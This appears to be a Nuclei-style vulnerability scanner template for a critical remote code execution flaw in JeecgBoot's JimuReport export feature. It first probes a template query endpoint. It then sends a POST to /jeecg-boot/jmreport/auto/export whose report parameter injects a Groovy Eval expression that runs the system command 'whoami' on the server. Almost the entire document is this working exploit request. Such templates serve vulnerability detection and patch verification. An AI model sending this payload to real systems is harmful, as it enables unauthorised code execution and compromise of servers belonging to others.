id: poc-lahzkchq5lhcub8t
info:
  name: JeecgBoot 积木报表auto export存在远程代码执行漏洞(XVE-2026-53510)
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2026
http:
- raw:
  - 'GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10 HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json


    导出报表代码执行'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - "POST /jeecg-boot/jmreport/auto/export HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\nContent-Type: application/json\nAccept: application/json\n\n{\n  \"reportParams\": [\n    {\n      \"id\": \"907480464532770816\",\n      \"params\": {\n        \"x\": \"=use groovy.util.Eval; Eval.me('throw new RuntimeException(\\\"whoami\\\".execute().text)')\"\n      },\n      \"exportType\": \"pdf\"\n    }\n  ]\n}"
  redirects: false
  matchers:
  - status:
    - 200
    type: status
